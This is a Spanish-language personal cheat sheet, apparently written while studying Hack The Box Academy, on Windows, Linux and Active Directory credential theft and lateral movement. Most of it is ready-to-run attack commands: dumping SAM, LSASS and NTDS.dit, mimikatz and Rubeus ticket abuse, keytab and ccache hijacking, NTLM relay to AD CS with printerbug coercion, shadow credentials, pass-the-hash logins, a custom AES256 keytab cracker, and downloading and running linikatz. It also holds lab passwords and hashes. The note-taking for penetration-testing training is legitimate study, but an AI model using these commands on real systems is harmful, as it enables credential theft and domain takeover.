# Windows
## SAM, SYSTEM Y SECURITY
Primero para sacar los volcados de los Hashes necesitaremos obtener el SAM y el SYSTEM, aunque también es recomendable sacar el SECURITY ya que puede tener alguna credencial en el caché.

Hay varias formas de hacer esto, la mas básica es con permisos de administrador:
```cmd
reg.exe save hklm\sam C:\sam.save

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```

Nos movemos estos archivos a nuestra kali y desde allí usaremos [[Secretsdump]]

Una vez que tengamos credenciales podremos obtener los secretos LSA con netexec:
```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

También podríamos usar netexec para sacar el SAM con --sam
(SIN REQUERIR PERMISOS DE MÁXIMOS)

## LSASS
### Con GUI:
![[Pasted image 20250920195702.png]]
Se crea un archivo llamado `lsass.DMP`y se guarda en `%temp%`

### Con CLI
Primero necesitaremos sacar el ID:
```cmd
tasklist /svc
```
O bien mediante:
```powershell
Get-Process lsass
```

Una vez obtenido el ID hacemos el volcado:
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump [ID] C:\lsass.dmp full
```
(Esto lo crea en C:\\ en la raíz)

#### Una vez obtenido el lsass.dmp para extraer las credenciales necesitaremos usar pypykatz veámoslo:
```
pypykatz lsa minidump [Archivo].dmp 
```


## CMDKEY
Podemos enumerar credenciales almacenadas para un usuario en concreto con cmdkey:
```
cmdkey /list
```

![[Pasted image 20250921185725.png]]

### Suplantamos la identidad
Como vemos en la imagen de arriba tenemos un credencial interactiva como el usuario mcharles, lo usaremos de la siguiente forma:
```cmd
runas /savecred /user:SRV01\mcharles cmd
```
Esto nos dará una cmd como el usuario mcharles

## MIMIKATZ

#Maquina_victima_Windows 
```cmd
mimikatz.exe

privilege::debug

sekurlsa::credman

vault::cred

------------------------------------------------------

sekurlsa::minidump C:\lsass.dmp

sekurlsa::LogonPasswords
```
Otras herramientas interesantes para sacar credenciales son SharpDPAPI LaZagne y DonPAPI

## Credenciales en la bóveda de Windows
La bóveda depende de la versión de Windows, estas son las posibles rutas:
![[Pasted image 20250921193124.png]]

Podemos exportarlas con el siguiente comando:
```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

## NTDS.dit
#Active_Directory
Para sacar este archivo necesitarnos ser administrador de la máquina local o del dominio

Una vez comprobado los permisos vamos a usar VSS con vssadmin para sacar una instantánea del volumen donde se instalo el AD en la configuración:
```PowerShell
vssadmin CREATE SHADOW /For=C:
```
![[Pasted image 20250921204249.png]]

```PowerShell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Y con esto ya tendríamos el NTDS.dit, pero  al igual que con `SAM`, los hashes almacenados en `NTDS.dit`están cifrados con una clave almacenada en `SYSTEM`. Para extraerlos correctamente, es necesario descargar ambos archivos.

Nos movemos el archivo y lo damos con [[Secretsdump]]
```
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### Otra forma mucho más rápido para hacer esto es con netexec
```
netexec smb 10.129.201.57 -u [USER] -p [PASSWORD] -M ntdsutil
```

Y los rompemos con hashcat como siempre con el -m 1000
Si no lo conseguimos siempre podemos hacer PassTheHass:
```
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## Credenciales mediante búsqueda de strings y navegando por directorios

Palabras interesantes y comunes para buscar:
- Passwords
- Passphrases
- Keys
- Username
- User account
- Creds
- Users
- Passkeys
- configuration
- dbcredential
- dbpassword
- pwd
- Login
- Credentials

Vamos a buscar con el siguiente comando:
```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
O
```powershell
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in `web.config` files on dev machines and IT shares
- Password in `unattend.xml`
- Passwords in the AD user or computer description fields
- KeePass databases (if we are able to guess or crack the master password)
- Found on user systems and shares
- Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)
## Herramientas automáticas para búsqueda de crendeciales
-Lazagne
-Eviltree
-SessionGopher
-PowerHunt
-neteexec


# Linux
## Biblioteca PAM
La biblioteca PAM donde se almacenan las contraseñas que se han ido modificando a lo largo del tiempo para cada usuario, necesitaremos permisos de administrador:
```
sudo cat /etc/security/opasswd
```
## Unshadow the Shadow
Para poder descifrar contraseñas almacenadas en el shadow podemos hacerlo con la funcion unshadow de John The Ripper:
```s
sudo cp /etc/passwd /tmp/passwd.bak 

sudo cp /etc/shadow /tmp/shadow.bak 

unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

Una vez hecho el unshadow le tiramos con hashcat:
```
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

## Credenciales mediante búsqueda de strings y navegando por directorios

Podemos mirar en:
- `Files` including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
- `History` including logs, and command-line history
- `Memory` including cache, and in-memory processing
- `Key-rings` such as browser stored credentials
- Tres extensiones clave: `.config`, `.conf`, `.cnf`

Una herramienta muy buena para esto es [[EvilTree]]

### Por archivos de configuración
```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
### Por palabras clave
```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
### Por bases de datos
```
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
### Por notas
```
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
### Por scripts
```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
### Por Cronjobs
```
cat /etc/crontab 
```
### Por historial
```
/home/*/.bash*
```
### Por Logs
```
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
### Por caché 
Para ello podemos hacer uso de herramientas automatizadas como:
```
sudo python3 mimipenguin.py
```

```
export PYTHONPATH="$PWD:$PYTHONPATH"

python3 laZagne.py all

python2.7 laZagne.py all
```
Y sí no esta mal, hay una versión en python para linux, tendremos que poner los requierements.txt en un venv para que funcione
### Credenciales en Buscadores
```
ls -l .mozilla/firefox/ | grep default
```
Ejemplo:
```
ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
Pero estarán encriptadas, para sacarlas sin encriptar:
```
python3.9 firefox_decrypt.py
```

## Herramientas automáticas para búsqueda de crendeciales
-Lazagne
-Eviltree
-manspider
-netexec 

## Pass The Hash

[[Psexec]]
[[Wmiexec]]
SMBEXEC (Añadir futuro)
[[RDP (3389)]]
[[🐚 Shells & Payloads]]
Para ejecutar un runas en windows con pht:
```PowerShell
sekurlsa::pth /user:Administrador /domain:CORP.LOCAL /ntlm:TU_HASH_AQUI /run:cmd.exe
```
Desde mimikatz!! CREO QUE HAY UNA AMNERA SIN MIMIKATZ

PowerShell bypass:
```
powershell -ep bypass
```

## Pass The Key (OverPassTheHash)
Consiste en obtener un TGT o un TGS , con el TGT podremos crear TGS y con los TGS podremos autenticarnos al servicio para el que estaba establecido ese ticket. Para esto necesitamos ser administrador.

Para conseguir un ticket válido podremos hacerlo mediante rubeus o mimikatz:
Con mimikatz lo haremos con `sekurlsa::tickets` y con rubeus con la opción `dump` este ultimo lo tirara por pantalla en formato base64 podemos ponerle la opción "/nowrap" para que sea mas cómodo

>[!WARNING]
>Al momento de escribir esto, `Mimikatz version 2.2.0 20220919`al ejecutarlo, `sekurlsa::ekeys`se muestran todos los hashes como des_cbc_md4 en algunas versiones de Windows 10. Los tickets exportados (sekurlsa::tickets /export) no funcionan correctamente debido a un cifrado erróneo. Es posible usar estos hashes para generar nuevos tickets o usar Rubeus para exportar tickets en formato Base64.

Otra posibilidad es falsificarlos haciendo #OverPassTheHash
OverPass The Hash te permite mediante en hash ntlm conseguido de alguna manera poder pedir un TGT de kerberos y poder moverte por la red mediante kerberos.

>[!Tip]
>#OverPassTheHash es útil cuando los dominios tienen desactivado la autenticación NTLM y solo es posible mediante kerberos.

Para ello desde mimikatz lo podemos sacar los hashesh de kerberos con con `sekurlsa::ekeys`
 Una vez obtenidos los hashes `AES256_HMAC`y `RC4_HMAC` podremos realizar el ataque.
```
sekurlsa::pth /domain:[DOMINIO.LOCAL] /user:[USUARIO] /ntlm:[HASH]
```

 >[!Nota]
 >La cosa es que el ntlm usado en el PassTheHash u el rc4 de kerberos son idénticos por lo cual no hay diferencia en el comando pero si solo obtuviéramos el aes256 la cosa cambia pero solo habría que poner mimikatz cambiando `/ntlm` como usábamos en PTH `/aes256`
 >Pongo una captura a continuación para ver la diferencia más visual:
 >![[Pasted image 20260419140656.png]]
 >

Para Rubeus el comando para hacer Pass The Ticket lo usaremos con el siguiente comando:
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
>[!Tip]
>Lo bueno de Rubeus a diferencia de Mimikatz es que Rubeus no necesita permisos de administrador para hacer el OverPassTheHash (Tambien llamado PassTheKey)

## Pass The Ticket

### Desde Windows
Ahora que tenemos tickets de Kerberos podemos utilizarlos para movernos dentro del entorno haciendo #PassTheTicket 
Primero realizamos un ataque #OverPassTheHash con Rubeus y conseguimos un ticket en Base64. También podemos usar la flag `/ptt` para importar el ticket a la sesión actual:

```
Rubeus.exe asktgt /domain:[Dominio.local] /user:[User] /rc4:[Hash_NTLM] /ptt
```

Nos fijaremos de que el ticket se importa correctamente por que nos aparecerá por pantalla `[+] Ticket successfully imported!`

Otra forma de importar la sesión actual es utilizando el hash con la extensión `.kirbi`

```
Rubeus.exe ptt /ticket:[Archivo.kirbi]
```

También nos fijamos como antes de que ponga `[+] Ticket successfully imported!`

Otra manera para no tocar disco y ser menos detectables es pasarlo en formato Base64, el cual pegamos tal cual en Rubeus en el apartado de `/ticket:` 

Para obtenerlo en base64 lo podemos pasar con el comando de PowerShell:
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[ARCHIVO.KIRBI]"))
```

Para hacer #PassTheTicket con Mimikatz usaremos el comando `kerberos::ptt`:
```
privilege::debug

kerberos::ptt "C:\RUTA\AL\[ARCHIVO.KIRBI]"
```

>[!Nota] En lugar de abrir mimikatz.exe con cmd.exe y salir para obtener el ticket en el símbolo del sistema actual, podemos usar el módulo Mimikatz `misc` con el comando `misc::cmd`

#### Flujo con mimikatz
Ejecutamos mimikatz:
```MimiKatz
privilege::debug

kerberos::ptt "C:\RUTA\AL\TICKET.KIRBI"

exit
```

Ahora después de eso abrimos una PowerShell:
```Powershell
Enter-PSSession -ComputerName DC01
```
Y con esto ya podemos ejecutar comandos como ese usuario dentro de la maquina objetivo (Podemos verificar con whoami y hostname)

Este ultimo comando es como usar WinRM desde Kali ya que es el sistema de gestión remota de PowerShell que a veces los administradores activan para su gestión  y este servicio comparte puerto con el de WinRM (5985/5986)
#### Flujo con Rubeus
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
Con este comando abrimos una CMD para poder usar Rubeus y pedir un nuevo TGT:
```
Rubeus.exe asktgt /user:[Usuario] /domain:[Dominio.local] /aes256:[Hash_Aes256] /ptt
```

Después de esto que se nos habrá importado el ticket directamente ejecutaremos una PowerShell como antes y pondremos el mismo comando que usábamos en Mimikatz:
```Powershell
Enter-PSSession -ComputerName DC01
```

### Desde Linux
En la mayoría de los casos el los sistemas Linux almacenan los tickets Kerberos en archivos ".ccache" en /tmp. Por defecto se almacenan en variables de entorno llamada "KRB5CCNAME" los cuales suelen tener permisos de lectura/escritura específicos pero un usuario administrador podría hacerse fácilmente con ellos.

También hay otro caso que seria mediante archivos "keytab" los cuales tienen mezcla de Kerberos y claves cifradas de la contraseña de Kerberos, este también puede usarse para autenticarse pero lo malo es que al cambiar de contraseña hay que generar todos los archivos de nuevo.
Estos archivos normalmente lo usan scripts para autenticarse automáticamente mediante Kerberos sin necesidad de interacción humana.
>[!Nota]
>Cualquier equipo con cliente de Kerberos puede crear archivos Keytab, y estos se pueden copiar y pegar en otros dispositivos ya que no están restringidos al PC donde se crearon

Una vez dentro de la máquina para saber si esta unida al dominio podemos verlo con el comando de linux `realm list` , también podemos hacerlo con el comando `ps -ef | grep -i "winbind\|sssd"` el cual si están en ejecución es que están unidos a un dominio

Una vez verificado que esta la maquina linux comprometida al dominio vamos en busca de esos tickets: `find / -name *keytab* -ls 2>/dev/null`  (Recordamos que necesitamos permisos de escritura/lectura en los tickets para poder usarlos)
También podríamos encontrarlos en crontabs con scripts automáticos que necesiten solicitar algo del dominio como podemos ver en el siguiente ejemplo:
![[Pasted image 20260420192756.png]]
Si nos fijamos usa kinit para usar el ticket de Kerberos establecido en esa ruta, con kinit podemos importarlo a nuestra sesión y usarlo también.

Para encontrar tickets en ccache: `env | grep -i krb5` y como dijimos estos estarán por defecto en /tmp así que nos vamos allí y vemos con: `ls -la /tmp`.

A continuación mostramos los dos flujos dependiendo del ticket que encontremos:

##### Abuso de Keytabs
Otra herramienta que vamos a necesitar es "klist" el cual si le pasamos un archivo Keytab nos muestra su información, esto nos servirá para ver el usuario asociado a dicho ticket:
`klist -k -t /RUTA/AL/ARCHIVO.keytab`

Antes del siguiente paso esta bien guardar el ccache que estamos usando en el momento para reestablecer la sesión con el usuario que estaba por defecto al iniciar para ello lo haremos con:
```
echo $KRB5CCNAME

cp $KRB5CCNAME /tmp/[USUARIO].ccache
```

Una vez asegurado el nombre de usuario para ese tickets lo suplantamos con el siguiente comando:
```
klist ##Con esto vemos el ticket que estamos usando en el momento de antes

kinit [USUARIO]@[DOMINIO] -k -t /RUTA/AL/ARCHIVO.keytab

klist ##Para verificar la suplantación
```

Importante usar el ``su - [USER]@[DOMINIO.LOCAL]`` para obtener su sesión completa

>[!Nota]
>Otra herramienta que nos va a servir para sacar información valiosa de estos Keytabs es "keytabextract.py" con el comando: `python3 keytabextract.py /RUTA/AL/ARCHIVO.keytab`
>Esta nos permitirá obtener los hashes y ya vimos más arriba como usarlos.
>
>También podemos coger el hash NTLM que es el más sencillo y podremos romperlo con john, con hashcat o incluso con suerte en Crackstation (Y usar `su - [USER]@[DOMINIO.LOCAL]`) y confirmar la sesión con `klist` de nuevo

A la hora de rompero si solo sale AES-256 y queremos romperlo por que estamos pillado he hecho un scirpt:
```
#!/usr/bin/env python3
import sys, binascii, argparse
from impacket.krb5.crypto import string_to_key, Enctype

parser = argparse.ArgumentParser(description="Crack Kerberos AES256 keytab hash")
parser.add_argument("-H", "--hash",     required=True, help="AES256 hash del keytab")
parser.add_argument("-r", "--realm",    required=True, help="Realm (ej: INLANEFREIGHT.HTB)")
parser.add_argument("-u", "--user",     required=True, help="Usuario (ej: svc_workstations)")
parser.add_argument("-w", "--wordlist", required=True, help="Ruta a la wordlist")
args = parser.parse_args()

salt   = (args.realm + args.user).encode()
target = args.hash.lower()

print(f"[*] Crackeando: {target}")
print(f"[*] Salt: {args.realm + args.user}\n")

try:
    with open(args.wordlist, "rb") as f:
        for i, line in enumerate(f, 1):
            password = line.strip()
            key = string_to_key(Enctype.AES256, password, salt)
            if binascii.hexlify(key.contents).decode() == target:
                print(f"[+] PASSWORD: {password.decode()}")
                sys.exit(0)
            if i % 10000 == 0:
                print(f"[*] {i} probadas...", end="\r")
    print("\n[-] No encontrada")
except KeyboardInterrupt:
    print("\n[-] Interrumpido")
```

```
python3 ScriptAlternativoRompeAES-256.py -H 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d -r INLANEFREIGHT.HTB -u svc_workstations -w /usr/share/wordlists/rockyou.txt
```
##### Abuso de ccache
Primero deberemos de ser ==root== en la máquina para poder leer estos archivos, teniendo esto en cuenta vamos a tmp y buscamos archivos ocultos a ver si tenemos.

Una vez identificados los tickets que queremos hacemos la suplantación con:
```
klist ##Con esto vemos el ticket que estamos usando en el momento de antes

cp /RUTA/AL/TICKET /root

export KRB5CCNAME=/root/[NOMBRE_DEL_TICKET]

klist ##Para verificar la suplantación
```

Y con  esto ya podremos usar smbclient por ejemplo: `smbclient //dc01/C$ -k -c ls -no-pass`

> [!Danger]
> Estos tickets pueden caducar y no funcionarnos los ataques
> Podemos verificarlo con `klist -c /RUTA/AL/TICKET`
> 
> Otra cosa a tener en cuenta que siendo root podemos ver el keytab de Maquina$ el cual podemos usar , siempre esta en `/etc/krb5.keytab` y podemos verlo con `klist -k /RUTA/AL/TICKET` y usarlo con `kinit '[USUARIO]$@[DOMINIO.LOCAL]' -k -t /etc/krb5.keytab`

Herramientas que nos permiten usar Kerberos (teniéndolo exportado correctamente en 'KRB5CCNAME' ):
-Smbclient → `smbclient //dc01/C$ -k -no-pass`
-Impacket-wmiexec → `impacket-wmiexec dc01 -k -no-pass`
-Evil-winrm → `evil-winrm -i dc01 -r INLANEFREIGHT.HTB`

###### ATACANDO DESDE FUERA DEL DOMINIO:
Cuando atacamos desde nuestra máquina Kali que NO está en el dominio, necesitamos tunelizar el tráfico hacia el KDC.

  **1. Preparar la máquina**
  /etc/hosts → resolver nombres del dominio

  172.16.1.10 inlanefreight.htb dc01.inlanefreight.htb dc01
  172.16.1.5  ms01.inlanefreight.htb ms01

  **2. Levantar túnel con Ligolo-ng** (interfaz tun0 activa con ruta a red interna)

  **3. Transferir el ccache desde la máquina víctima y exportar**
  export KRB5CCNAME=/root/[NOMBRE_DEL_TICKET]

  **4. Herramientas (sin proxychains, Ligolo crea interfaz real)**
  Smbclient        → smbclient //dc01/C$ -k -c ls -no-pass
  Impacket-wmiexec → impacket-wmiexec dc01 -k -no-pass
  Evil-winrm       → evil-winrm -i dc01 -r INLANEFREIGHT.HTB

  > [!Warning]
  > Evil-winrm requiere además:
  > - `sudo apt install krb5-user`
  > - `/etc/krb5.conf` con el realm y KDC configurados:
  > ```
  > [libdefaults]
  >     default_realm = INLANEFREIGHT.HTB
  > [realms]
  >     INLANEFREIGHT.HTB = {
  >         kdc = dc01.inlanefreight.htb
  >     }
  > ```
  
##### Para convertir tickets
Para convertir tickets ccache en kirbi o viceversa usaremos Ticketconverter de Impacket:
```
impacket-ticketConverter [TICKET_CCACHE] [ARCHIVO].kirbi
```
#### Linikatz
Es igual que Mimikatz pero en linux:
```
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh

./linikatz.sh
```

Para todo el ejemplo de uso desde fuera del dominio no lo he comprobado del todo pero esta todo en `https://academy.hackthebox.com/app/module/147/section/1657`

## Pass The Certificate
PKINIT (Public Key Cryptography for Initial Authentication) es una extensión del protocolo de Kerberos que habilita la criptografía de clave pública en la pre-autenticación inicial. Para aprovecharnos de esto que normalmente se usa con las tarjetas inteligentes (que van con las claves privadas). 

Para aprovecharnos de este protocolo vamos a usar #PassTheCertificate ,principalmente se refiere a una técnica usada para obtener TGTs.

Hay dos tipos de ataques con estos certificados `AD CS NTLM Relay Attack (ESC8)` (Este se toca a fondo en un módulo de HTB) y `Shadow Credentials (msDS-KeyCredentialLink)` vamos a ver cada ataque por separado.

==Estos ataques se pueden hacer con "Certipy" que ya lo he tocado en el trabajo.==
### AD CS NTLM Relay Attack
#### Conseguimos un certificado
Pero ahora vamos a verlo diferente, para ello habrá que conseguir algun certificado, por lo qeu vamos a poner el ntlmrelayx a la escucha y relayando al DC:
```
impacket-ntlmrelayx -t http://[IP_CA]/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```
Para saber la IP de la CA:
```
ldapsearch -H ldap://10.129.234.174 -x -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=inlanefreight,DC=local" -D "wwhite@inlanefreight.local" -w 'package5shores_topher1' | grep dNSHostName

certipy-ad find -u wwhite@INLANEFREIGHT.LOCAL -p 'package5shores_topher1' -dc-ip 10.129.234.174

certutil -config - -ping

net view /domain | findstr CA 

nmap -p 80,443 --open -sV 10.129.62.0/24 | grep certsrv
```

>[!Nota]
>--template puede ser diferente, este es el modelo base que utilizan los DCs para la autenticación. Se pueden enumerar mas con certipy.

Ahora quedaría quedarse a la espera de una autenticación para relayarla pero vamos a forzar a las cuentas máquina a autenticarse. En el siguiente ejemplo se usa printerbug por que tiene la vulnerabilidad pero podríamos usar Coerce_Plus por ejemplo que lo hemos visto más:
```
wget -q https://raw.githubusercontent.com/dirkjanm/krbrelayx/refs/heads/master/printerbug.py

python3 printerbug.py [DOMINIO.LOCAL]/[USUARIO]:`[CONTRASEÑA]`@[IP_MAQUINA_VICTIMA] [IP_KALI]
```

Una vez que tengamos éxito con el comando veremos que en la ventana del ntlmrelayx que hemos conseguido un certificado:
`GOT CERTIFICATE! ID 8`
#### Realizamos el #PassTheCertificate 
Una manera de hacer este ataque es con la herramienta `gettgtpkinit.py`
```
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
 
python3 -m venv .venv 

source .venv/bin/activate 

pip3 install -r requirements.txt
```
>[!Caution]
> Puede salir el error: `Error detecting the version of libcrypto` para solucionarlo nos instalamos también la biblioteca de `oscrypto` con el comando `pip3 install -I git+https://github.com/wbond/oscrypto.git`

Una vez todo listo hacemos el ataque:
```
python3 gettgtpkinit.py -cert-pfx [RUTA/AL/ARCHIVO.pfx] -dc-ip [IP_DC] '[DOMINIO.LOCAL]/dc01$' /tmp/dc.ccache
```
Si hemos tenido éxito nos saldrá algo como `INFO:minikerberos:Saved TGT to file`

Una vez obtenido este TGT ya sabemos como actuar haciendo #PassTheTicket por ejemplo para sacar los secretos NTDS:
```
export KRB5CCNAME=/tmp/dc.ccache

klist ##Para Confirmar

impacket-secretsdump -k -no-pass -dc-ip [IP_DC] -just-dc-user [USUARIO_QUE_QUEREMOS_EL_HASH] '[DOMINIO.LOCAL]/DC01$'@DC01.INLANEFREIGHT.LOCAL

python3 getnthash.py -key 65ab4e1cc3f91d72a9fddde9e485bd0305e772dca64c1094f0ed60c45f12a7ef 'INLANEFREIGHT.local/dc01$' ##Con este es mas comodo por que nos da el NT hash de la maquina pero necesitamos el anterior tambien para sacar el admin entre otros
```

### Shadow Credentials
Para realizar este ataque necesitamos abusar de un permiso mal controlado en el AD llamado `(msDS-KeyCredentialLink)`
![[Pasted image 20260421231048.png]]

Para este ataque podemos ayudarnos de la herramienta pywhisker:
```
python3 pywhisker.py --dc-ip [IP_DC] -d [DOMINIO.LOCAL] -u [USUARIO_CON_PRIVILEGIOS_ADDKEYCREDENTIALLINK] -p '[CONTRASEÑA]' --target [USUARIO_AFECTADO_POR_PERMISOS] --action add
```
Si todo funciona bien veremos algo como `[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx` y justo después de eso la contraseña que deberemos de usar para usar ese certificado.

>[!DANGER]
>SI LA HERRAMIENTA DE ANTES NO FUNCIONA MÁS ALANTE ESTA CERTIPI

Una vez obtenido esto vamos a usarlo con la herramienta gettgtpkinit.py
```
python3 gettgtpkinit.py -cert-pfx [RUTA/AL/ARCHIVO.pfx] -pfx-pass '[CONTRASEÑA_DEL_COMANDO_ANTERIOR]' -dc-ip []IP_DC] [DOMINIO.LOCAL]/[USUARIO_SUPLANTADO] /tmp/[USUARIO_SUPLANTADO].ccache
```
Y veremos algo como `INFO:minikerberos:Saved TGT to file`

Una vez con esto ya sabemos como proceder #PassTheTicket por ejemplo con evil-winrm :
```
export KRB5CCNAME=/tmp/[USUARIO_SUPLANTADO].ccache ##O la ruta donde lo guardamos

evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

#### Si no funciona la herramienta:
Puede que la herramienta de antes no funcione bien como cuando hice el modulo así que el complementario en certipy:
```
certipy-ad shadow auto -u [USUARIO_CON_PRIVILETGIOS_ADDKEYCREDENTIALLINK]@[DOMINIO.LOCAL] -p '[CONTRASEÑA]' -account [USUARIO_A_SUPLANTAR] -dc-ip [IP_DC] -debug
```

Con esto nos dará un hash NT directamente es decir que nos ahorramos pasos y podremos usarlo por ejemplo para conectarnos:
```
xfreerdp3 /u:jpinkman /pth:9d995e5865f9dbfc701210466f0c78fe /d:INLANEFREIGHT.LOCAL /v:10.129.234.174

evil-winrm -i 10.129.234.174 -u jpinkman -H 9d995e5865f9dbfc701210466f0c78fe

impacket-psexec -hashes :9d995e5865f9dbfc701210466f0c78fe INLANEFREIGHT.LOCAL/jpinkman@10.129.234.174
```

### ¿Que pasa si no hay PKINIT?
Hay veces que obtendremos un certificado pero no podremos usarlo para preautenticarnos en víctimas específicas (Por ejemploi una cuenta de máquina de controlador de dominio) debido a que el KDC no admite EKU.
La herramienta [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) se creo para este tipo de situaciones podemos encontrar mas inflo  [aquí](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).
